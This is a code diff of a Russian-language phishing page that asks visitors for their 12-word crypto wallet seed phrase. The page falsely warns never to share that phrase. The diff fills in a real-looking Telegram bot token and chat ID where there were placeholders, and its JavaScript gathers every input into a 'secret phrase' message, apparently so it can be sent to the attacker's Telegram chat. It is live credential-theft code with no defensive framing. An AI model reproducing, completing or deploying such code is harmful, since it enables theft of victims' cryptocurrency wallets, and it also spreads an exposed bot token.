@@ -163,7 +163,7 @@
                     <input type="text" id="word12" name="word12" placeholder="Введите слово" required>
                 </div>
             </div>
-            <button type="submit">Отправить</button>
+            <button type="submit">Подтвердить</button>
         </form>
         <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
     </div>
@@ -175,8 +175,8 @@
         document.getElementById('seedForm').addEventListener('submit', function (e) {
             e.preventDefault(); // Предотвращаем перезагрузку страницы
 
-            const botToken = 'ВАШ_ТОКЕН_БОТА'; // Замените на токен вашего Telegram-бота
-            const chatId = 'ВАШ_ID_ЧАТА'; // Замените на ваш ID чата
+            const botToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg'; // Замените на токен вашего Telegram-бота
+            const chatId = '@bdsjxjdhd'; // Замените на ваш ID чата
             const inputs = document.querySelectorAll('input');
             const seedPhrase = Array.from(inputs).map(input => input.value.trim()).join(' ');
             const message = `Секретная фраза: ${seedPhrase}`;
